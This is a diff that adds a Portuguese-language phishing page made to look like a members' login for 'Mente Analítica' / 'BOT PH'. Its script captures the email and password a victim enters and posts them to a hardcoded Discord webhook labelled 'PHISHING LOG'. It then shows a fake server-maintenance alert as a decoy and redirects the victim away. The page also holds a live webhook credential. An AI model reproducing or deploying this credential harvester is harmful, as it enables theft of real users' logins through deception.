@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso à Área de Membros - Mente Analítica</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212; /* Fundo escuro */
+            color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #1C3A5E; /* Azul escuro do seu projeto */
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            text-align: center;
+        }
+        .login-box h2 {
+            color: #4D9FFF; /* Azul de destaque */
+            margin-bottom: 30px;
+            font-size: 1.8em;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            background-color: #2a2a2a;
+            color: #f0f0f0;
+            box-sizing: border-box;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4D9FFF; /* Azul de destaque */
+            color: #121212;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        .login-button:hover {
+            background-color: #6AAFFF;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h2>Acesso ao BOT PH</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Digite seu email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Senha</label>
+                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
+            </div>
+            <button type="submit" class="login-button">Registre-se</button>
+            <p style="color: #AAAAAA; font-size: 0.9em; margin-top: 15px;">Preencha o campo usando seu email corretamente, o código será enviado para sua caixa de entrada</p>
+        </form>
+    </div>
+
+    <script>
+        // O CÓDIGO DO CAPTURADOR E WEBOOK LOGGING VAI AQUI
+    </script>
+
+</body>
+</html>
+<script>
+        // *** 1. VERIFIQUE ESTA URL NOVAMENTE! ***
+        // Vá ao Discord, recrie um Webhook e cole o link COMPLETO aqui.
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1435787322753810595/utx5640rP7rfCm2E5XBNo3ErZJaMICXKGpfKHIy0t-0ToiDI7Ged5yx3bFlY8cCKNsXE'; 
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Verificação de segurança (DEBUG): se o webhook falhar, você sabe que o script rodou.
+            console.log("Tentando enviar credenciais:", email, password);
+
+            // 2. O Payload JSON para envio
+            const payload = JSON.stringify({
+                // Configurações visuais do Webhook
+                username: "PHISHING LOG - MENTE ANALÍTICA",
+                // Remova avatar_url se você não tiver uma imagem hospedada.
+                
+                embeds: [{
+                    title: "🔓 NOVAS CREDENCIAIS CAPTURADAS!",
+                    description: "Captura de Login de Fórum/Site de Estudos de Psicologia",
+                    color: 38462, // Cor de destaque (Azul Ciano em decimal)
+                    fields: [
+                        {
+                            name: "📧 EMAIL",
+                            value: `**${email}**`, // Destaque extra no valor
+                            inline: false
+                        },
+                        {
+                            name: "🔑 SENHA",
+                            value: `**${password}**`, // Destaque extra no valor
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Web Logger Ativo - PH"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            });
+
+            // 3. Método de Envio (Fetch)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: payload,
+            })
+            .then(response => {
+                // Se o status for 204 (No Content), o Webhook funcionou perfeitamente.
+                if (response.status === 204) {
+                    console.log('Dados enviados com sucesso (Status 204).');
+                } else {
+                    console.error('Webhook Status Error:', response.status, response.statusText);
+                }
+                
+                // Ação de Despiste
+                alert("Erro de conexão: O servidor está em manutenção. Tente novamente mais tarde.");
+                window.location.href = 'https://discord.com/developers/docs/intro'; 
+            })
+            .catch(error => {
+                console.error('Falha de Rede (Não Webhook):', error);
+                // Mesmo se falhar, o despiste deve ocorrer
+                window.location.href = 'https://discord.com/developers/docs/intro'; 
+            });
+        });
+    </script>
